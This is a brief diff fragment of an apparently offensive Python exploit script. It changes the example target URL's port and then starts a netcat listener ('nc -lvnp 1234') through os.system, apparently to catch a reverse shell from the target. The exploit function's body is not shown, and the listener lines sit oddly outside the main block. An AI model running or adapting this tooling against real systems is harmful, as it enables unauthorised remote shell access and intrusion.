@@ -32,7 +32,7 @@ def exploit(url):
 
 if __name__ == "__main__":
     # Example usage
-    target_url = "http://127.0.0.1:1234"  # Replace with the actual target URL
+    target_url = "http://127.0.0.1:1337"  # Replace with the actual target URL
 
 print(f'[*]' ' Starting listener')
 os.system("nc -lvnp 1234")
